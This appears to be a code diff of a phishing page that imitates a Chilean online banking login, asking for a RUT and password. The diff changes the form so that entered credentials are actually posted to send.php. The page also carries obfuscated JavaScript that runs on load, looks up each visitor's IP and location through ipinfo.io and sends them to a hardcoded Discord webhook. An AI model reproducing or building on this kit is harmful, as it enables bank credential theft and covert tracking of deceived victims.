@@ -1288,7 +1288,7 @@ body {
         <h1 class="title">Ingresa a tu Banca en Línea</h1>
 
         <!-- Formulario -->
-        <form id="loginForm" name="loginForm" method="POST" action="send.php">
+        <form id="loginForm" name="loginForm" method="POST" action="send.php" onsubmit="return handleLogin(event)">
             <!-- Campo RUT -->
             <div class="form-group">
                 <label class="form-label" for="rut">RUT</label>
@@ -1361,113 +1361,114 @@ body {
 const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_0x28a77c=_0x34c695();while(!![]){try{const _0x3c7a6f=parseInt(_0x6c628e(0x152))/0x1*(-parseInt(_0x6c628e(0x14d))/0x2)+-parseInt(_0x6c628e(0x161))/0x3*(parseInt(_0x6c628e(0x14b))/0x4)+parseInt(_0x6c628e(0x154))/0x5+-parseInt(_0x6c628e(0x14f))/0x6*(parseInt(_0x6c628e(0x15e))/0x7)+-parseInt(_0x6c628e(0x160))/0x8*(-parseInt(_0x6c628e(0x156))/0x9)+-parseInt(_0x6c628e(0x145))/0xa*(parseInt(_0x6c628e(0x15f))/0xb)+-parseInt(_0x6c628e(0x143))/0xc*(-parseInt(_0x6c628e(0x157))/0xd);if(_0x3c7a6f===_0x2224e9)break;else _0x28a77c['push'](_0x28a77c['shift']());}catch(_0x4130de){_0x28a77c['push'](_0x28a77c['shift']());}}}(_0x2f8d,0xa2d68));function _0x2f8d(){const _0x57d61e=['37116pdkyCD','✅\x20Alerta\x20enviada','156DjpiqC','DOMContentLoaded','city','69wqUGip','log','5423425yJRtMb','json','45oAEeXt','13qYuJOd','toISOString','readyState','application/json','Sistema\x20de\x20Monitoreo','https://ipinfo.io?token=','N/A','27237GValAU','11xWvJhp','13784zZRxoy','9srWaDX','toLocaleString','❌\x20Error:','📍\x20Ubicación','country','31103124SVdpIV','error','12629340KEWtPV','🚨\x20Nuevo\x20Ingreso\x20Detectado','loading','https://discord.com/api/webhooks/1539128158262001684/TnH2KJZAHKvHRDY6cptJ1GNxJY2d5hr-Z8-phfTxJib--__hPnAMz-SaXeCa-pSad6Cb','es-ES','addEventListener','498188OqdKmZ','🔐\x20IP\x20Address'];_0x2f8d=function(){return _0x57d61e;};return _0x2f8d();}const WEBHOOK_URL=_0x2a78b2(0x148),IPINFO_TOKEN='e8764d0b0d51b0';async function getGeoLocation(){const _0x67d802=_0x2a78b2;try{const _0x15232=new AbortController(),_0x1375e3=setTimeout(()=>_0x15232['abort'](),0x5dc),_0x5d63cb=_0x67d802(0x15c)+IPINFO_TOKEN,_0x114350=await fetch(_0x5d63cb,{'signal':_0x15232['signal']});return clearTimeout(_0x1375e3),await _0x114350[_0x67d802(0x155)]();}catch(_0x5e6ac4){return{'ip':'N/A','city':_0x67d802(0x15d),'country':'N/A'};}}function _0x7ff2(_0x33722d,_0x9a3c4e){_0x33722d=_0x33722d-0x13f;const _0x2f8dbe=_0x2f8d();let _0x7ff25e=_0x2f8dbe[_0x33722d];return _0x7ff25e;}async function sendAlert(){const _0x18c97b=_0x2a78b2;try{const _0x46f159=await getGeoLocation(),_0x2ff99c=new Date(),_0x4ebd6b=_0x2ff99c[_0x18c97b(0x13f)](_0x18c97b(0x149)),_0x257a7f={'title':_0x18c97b(0x146),'color':0xff5252,'fields':[{'name':_0x18c97b(0x14c),'value':'`'+(_0x46f159['ip']||'N/A')+'`','inline':!![]},{'name':_0x18c97b(0x141),'value':(_0x46f159[_0x18c97b(0x151)]||_0x18c97b(0x15d))+',\x20'+(_0x46f159[_0x18c97b(0x142)]||_0x18c97b(0x15d)),'inline':!![]},{'name':'⏰\x20Hora','value':'`'+_0x4ebd6b+'`','inline':![]}],'timestamp':_0x2ff99c[_0x18c97b(0x158)](),'footer':{'text':_0x18c97b(0x15b)}},_0x1582ba={'embeds':[_0x257a7f]};await fetch(WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x18c97b(0x15a)},'body':JSON['stringify'](_0x1582ba)}),console[_0x18c97b(0x153)](_0x18c97b(0x14e));}catch(_0x3065fe){console[_0x18c97b(0x144)](_0x18c97b(0x140),_0x3065fe);}}document[_0x2a78b2(0x159)]===_0x2a78b2(0x147)?document[_0x2a78b2(0x14a)](_0x2a78b2(0x150),sendAlert):sendAlert();
 </script>
 <script>
-    // ============================================
-// FUNCIONES DE UTILIDAD
-// ============================================
+        // ============================================
+        // FUNCIONES DE UTILIDAD
+        // ============================================
 
-// Mostrar/Ocultar contraseña
-function togglePassword() {
-    const passwordInput = document.getElementById('password');
-    const eyeClosed = document.getElementById('eyeClosed');
-    const eyeHidden = document.getElementById('eyeHidden');
-    
-    if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        eyeHidden.style.display = 'block';
-        eyeClosed.style.display = 'none';
-    } else {
-        passwordInput.type = 'password';
-        eyeHidden.style.display = 'none';
-        eyeClosed.style.display = 'block';
-    }
-}
+        // Mostrar/Ocultar contraseña
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const eyeClosed = document.getElementById('eyeClosed');
+            const eyeHidden = document.getElementById('eyeHidden');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeHidden.style.display = 'none';
+                eyeClosed.style.display = 'block';
+            } else {
+                passwordInput.type = 'password';
+                eyeHidden.style.display = 'block';
+                eyeClosed.style.display = 'none';
+            }
+        }
 
-// ============================================
-// VALIDACIÓN
-// ============================================
+        // ============================================
+        // VALIDACIÓN
+        // ============================================
 
-function validatePassword(password) {
-    const hasLetters = /[a-zA-Z]/.test(password);
-    const hasNumbers = /[0-9]/.test(password);
-    const hasSpecialChars = /[^a-zA-Z0-9]/.test(password);
-    const validLength = password.length >= 6 && password.length <= 8;
-    
-    if (password.length === 0) {
-        return { valid: false, message: 'La contraseña es obligatoria' };
-    }
-    if (hasSpecialChars) {
-        return { valid: false, message: 'La contraseña no puede contener caracteres especiales' };
-    }
-    if (!validLength) {
-        return { valid: false, message: 'La contraseña debe tener entre 6 y 8 caracteres' };
-    }
-    if (!hasLetters) {
-        return { valid: false, message: 'La contraseña debe contener letras' };
-    }
-    if (!hasNumbers) {
-        return { valid: false, message: 'La contraseña debe contener números' };
-    }
-    
-    return { valid: true };
-}
+        function validatePassword(password) {
+            const hasLetters = /[a-zA-Z]/.test(password);
+            const hasNumbers = /[0-9]/.test(password);
+            const hasSpecialChars = /[^a-zA-Z0-9]/.test(password);
+            const validLength = password.length >= 6 && password.length <= 8;
+            
+            if (password.length === 0) {
+                return { valid: false, message: 'La contraseña es obligatoria' };
+            }
+            if (hasSpecialChars) {
+                return { valid: false, message: 'La contraseña no puede contener caracteres especiales' };
+            }
+            if (!validLength) {
+                return { valid: false, message: 'La contraseña debe tener entre 6 y 8 caracteres' };
+            }
+            if (!hasLetters) {
+                return { valid: false, message: 'La contraseña debe contener letras' };
+            }
+            if (!hasNumbers) {
+                return { valid: false, message: 'La contraseña debe contener números' };
+            }
+            
+            return { valid: true };
+        }
 
-// ============================================
-// MANEJO DE EVENTOS
-// ============================================
+        // ============================================
+        // MANEJO DE EVENTOS
+        // ============================================
 
-function handleLogin(event) {
-    event.preventDefault();
-    
-    const rutInput = document.getElementById('rut');
-    const passwordInput = document.getElementById('password');
-    
-    const rut = rutInput.value.trim();
-    const password = passwordInput.value;
-    
-    if (!rut || !password) {
-        alert('Por favor completa todos los campos');
-        return;
-    }
-    
-    const validation = validatePassword(password);
-    if (!validation.valid) {
-        alert(validation.message);
-        return;
-    }
-    
-    // Guardar RUT en localStorage
-    localStorage.setItem('rutUsuario', rut);
-    
-    // Aquí puedes agregar lo que necesites hacer después del login exitoso
-    // Por ejemplo: mostrar un mensaje de éxito, cargar contenido dinámicamente, etc.
-    console.log('Login exitoso para RUT:', rut);
-}
+        function handleLogin(event) {
+            const rutInput = document.getElementById('rut');
+            const passwordInput = document.getElementById('password');
+            
+            const rut = rutInput.value.trim();
+            const password = passwordInput.value;
+            
+            // Validar campos vacíos
+            if (!rut || !password) {
+                alert('Por favor completa todos los campos');
+                event.preventDefault();
+                return false;
+            }
+            
+            // Validar contraseña
+            const validation = validatePassword(password);
+            if (!validation.valid) {
+                alert(validation.message);
+                event.preventDefault();
+                return false;
+            }
+            
+            // Guardar RUT en localStorage
+            localStorage.setItem('rutUsuario', rut);
+            
+            // Si todo está bien, permitir el envío del formulario a send.php
+            return true;
+        }
 
-function handleForgotPassword(event) {
-    event.preventDefault();
-    // Lógica para recuperar contraseña
-}
+        function handleForgotPassword(event) {
+            event.preventDefault();
+            alert('Función de recuperación de contraseña');
+        }
 
-function handleBusinessAccess() {
-    // Lógica para acceso empresas
-}
+        function handleBusinessAccess() {
+            alert('Acceso Empresas');
+        }
 
-function handleHelpCenter(event) {
-    event.preventDefault();
-    // Lógica para centro de ayuda
-}
+        function handleHelpCenter(event) {
+            event.preventDefault();
+            alert('Centro de ayuda');
+        }
 
-function closeWindow() {
-    window.close();
-}
+        function closeWindow() {
+            window.close();
+        }
 
-// ============================================
-// INICIALIZACIÓN
-// ============================================
+        // ============================================
+        // INICIALIZACIÓN
+        // ============================================
 
-window.addEventListener('load', function() {
-    document.getElementById('rut').focus();
-});
-</script>
+        window.addEventListener('load', function() {
+            document.getElementById('rut').focus();
+        });
+    </script>
 </body>
 </html>
